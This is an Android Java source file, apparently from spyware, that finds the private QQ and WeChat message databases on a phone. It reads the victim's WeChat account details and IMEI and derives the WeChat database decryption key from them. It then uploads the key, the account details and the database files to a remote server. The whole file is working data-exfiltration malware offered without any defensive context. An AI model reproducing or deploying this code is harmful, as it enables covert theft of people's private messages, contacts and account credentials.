package com.phone.data;

import java.io.File;
import java.util.ArrayList;
import java.util.regex.Pattern;
import org.json.JSONObject;

import com.network.NetworkLargeFile;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.annotation.SuppressLint;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;


@SuppressLint("DefaultLocale") public class QQWXDB implements Runnable{
	private static String TAG = "qqwxdb";
	private Context context;
	private int flag;
	
	public QQWXDB(Context context,int flag){
		this.context = context;
		this.flag = flag;
	}

	@SuppressLint("SdCardPath") public static ArrayList <String> getQQdb(Context context){
		ArrayList <String> ret = new ArrayList<String>();
		try {
			String qqdbdir = "/data/data/com.tencent.mobileqq/databases/";
			File dbdirfile = new File(qqdbdir);
			if (dbdirfile.exists() == false) {
				Log.e(TAG, "not found qqdb path");
				WriteDateFile.writeLogFile("not found qq database path\r\n");
				return ret;
			}
			File [] alldbdirfiles = dbdirfile.listFiles();
			if (alldbdirfiles == null) {
				WriteDateFile.writeLogFile("list qq database path error\r\n");
				return ret;
			}
			for (int k = 0; k < alldbdirfiles.length; k++) {
				if (alldbdirfiles[k].isFile()) {
					String filename = alldbdirfiles[k].getName();
					if (filename.endsWith(".db") == false) {
						continue;
					}
					String mainfn=filename.replace(".db", "");
					if (mainfn.length() < 5 || mainfn.length() >= 11) {
						continue;
					}
				    Pattern pattern = Pattern.compile("[0-9]*"); 
				    if(pattern.matcher(mainfn).matches() == true){					
			    		Log.e(TAG, "find qq database file name:"+filename);
			    		WriteDateFile.writeLogFile("find qq database path:" + filename +"\r\n");
			    		
			    		ret.add(alldbdirfiles[k].getAbsolutePath());
						//FileTools.copyFile(alldbdirfiles[k], newFile);
				    }
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(e);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getQQdb exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
		
		return ret;
	}
	
	
	@SuppressLint("DefaultLocale") public static JSONObject getWxInfo(Context context){
		JSONObject js = new JSONObject();
		try {
			String cfgfn = "com.tencent.mm_preferences";
			String uin = PrefOper.getValue(context, cfgfn, "last_login_uin");
			String phone = PrefOper.getValue(context, cfgfn, "last_login_bind_mobile");
			String email = PrefOper.getValue(context, cfgfn, "last_login_bind_email");
			String wxid = PrefOper.getValue(context, cfgfn, "login_weixin_username");
			String nick = PrefOper.getValue(context, cfgfn, "login_user_name");
			
			
			js.put("uin", uin);
			js.put("mobile", phone);
			js.put("email", email);
			js.put("username", wxid);
			js.put("name", nick);
			//String wxdbname = String.format("%s_%s_%s_%s_%s.wxdb", uin,nick,wxid,phone,email);
			
	        //int uind = Integer.parseUnsignedInt(uin);
	        //String uinstr = String.valueOf(uind);
			//String uinstr = uin;
			
			//int iid = Integer.parseInt(uin);
	        //String uinstr = String.valueOf(iid);
	        
	        TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
	        String deviceidString = tm.getDeviceId();
	        String wxdbkey = PublicFunction.getMD5(deviceidString + uin,true).substring(0,7).toLowerCase();
	        
	        JSONObject jskey = new JSONObject();
	        jskey.put("imei", deviceidString);
	        jskey.put("uin", uin);
	        jskey.put("key", wxdbkey);
	        String uidmd5 = PublicFunction.getMD5(uin, false);
	        jskey.put("uin_md5", uidmd5);
			
			Log.e(TAG,"weixin key:"+wxdbkey);
			SendDataToServer.sendDataToServer(jskey.toString().getBytes(), jskey.toString().getBytes().length, 
					Public.CMD_WEIXINDB_KEY, Public.IMEI,
					Public.SERVER_IP_ADDRESS,Public.SERVER_DATA_PORT,Public.PacketOptNone);
			

			Log.e(TAG, "make wx database file name:"+ js.toString());
			WriteDateFile.writeLogFile("get wxinfo:" + js.toString() +"\r\n");
		} catch (Exception e) {
			e.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(e);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getWxInfo exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}

		return js;
	}
	
	
	
	@SuppressLint("SdCardPath") public static ArrayList <String> getWeiXinDB(Context context){
		ArrayList <String> ret = new ArrayList<String>();
		try{		
			String wxdbdir = "/data/data/com.tencent.mm/MicroMsg/";
			File dbdirfile = new File(wxdbdir);
			if (dbdirfile.exists() == false) {
				Log.e(TAG, "not found wxdb path");
				WriteDateFile.writeLogFile("not found wx database path\r\n");
				return ret;
			}
			File [] alldbdirfiles = dbdirfile.listFiles();
			if (alldbdirfiles == null) {
				WriteDateFile.writeLogFile("list wx database path error\r\n");
				return ret;
			}
			for (int k = 0; k < alldbdirfiles.length; k++) {
				if (alldbdirfiles[k].isDirectory()) {
					String wxidmd5 = alldbdirfiles[k].getName();
					if (wxidmd5.length() != 32) {
						continue;
					}

					int i = 0;
					for ( i = 0; i < 32; i++) {
						byte b = wxidmd5.getBytes()[i] ;
					    if( (b>= '0' && b <= '9') ||(b >= 'a' && b <= 'f') ||(b >= 'A' && b <= 'F')){
					    	continue;
					    }else{
					    	break;
					    }
					}
					
					if (i== 32) {
						File fdb = new File(wxdbdir + wxidmd5 + "/EnMicroMsg.db");
						if (fdb.exists() == true && fdb.length() > 0) {
				    		Log.e(TAG, "find wx database file name:"+fdb.getAbsolutePath());
				    		WriteDateFile.writeLogFile("find wx database path:" + fdb.getAbsolutePath() +"\r\n");

				    		ret.add(fdb.getAbsolutePath());
				    		ret.add(wxidmd5);
						}
						
						File fav = new File(wxdbdir + wxidmd5 + "/enFavorite.db");
						if (fav.exists() == true && fav.length() > 0) {
				    		Log.e(TAG, "find wx enFavorite database file name:"+fav.getAbsolutePath());
				    		WriteDateFile.writeLogFile("find wx database path:" + fav.getAbsolutePath() +"\r\n");

				    		ret.add(fav.getAbsolutePath());
				    		ret.add(wxidmd5);
						}
						
						File sns = new File(wxdbdir + wxidmd5 + "/SnsMicroMsg.db");
						if (sns.exists() == true && sns.length() > 0) {
				    		Log.e(TAG, "find wx sns database file name:"+sns.getAbsolutePath());
				    		WriteDateFile.writeLogFile("find wx database path:" + sns.getAbsolutePath() +"\r\n");

				    		ret.add(sns.getAbsolutePath());
				    		ret.add(wxidmd5);
						}
					}
				}
			}
		}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getWeiXinDB exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
		
		return ret;
	}
	
	

	
	
	public void run(){
		if (flag == 1) {
			ArrayList<String> ret = getQQdb(context);
			for (int i = 0; i < ret.size(); i++) {
				NetworkLargeFile.SendNetworkLargeFileWithName(ret.get(i),"_" + i,
						Public.SERVER_IP_ADDRESS,Public.SERVER_DATA_PORT,Public.IMEI,
						Public.CMD_UPLOADQQDB,Public.PacketOptNone);
			}
		}else if(flag == 2){
			JSONObject js = getWxInfo(context);
			SendDataToServer.sendDataToServer(js.toString().getBytes(),js.toString().length(), 
					Public.CMD_UPLOADWEIXININFO, Public.IMEI);
			
			ArrayList<String> ret = getWeiXinDB(context);

			for (int i = 0; i < ret.size(); ) {
				Log.e(TAG, "send file:" + ret.get(i));
				
				String appendname = ret.get(i + 1);
				
				NetworkLargeFile.SendNetworkLargeFileWithName(ret.get(i),"_" + appendname,
						Public.SERVER_IP_ADDRESS,Public.SERVER_DATA_PORT,Public.IMEI,
						Public.CMD_UPLOADWEIXINDB,Public.PacketOptNone);
				
				i += 2;
			}

		}

		

	}
	
}
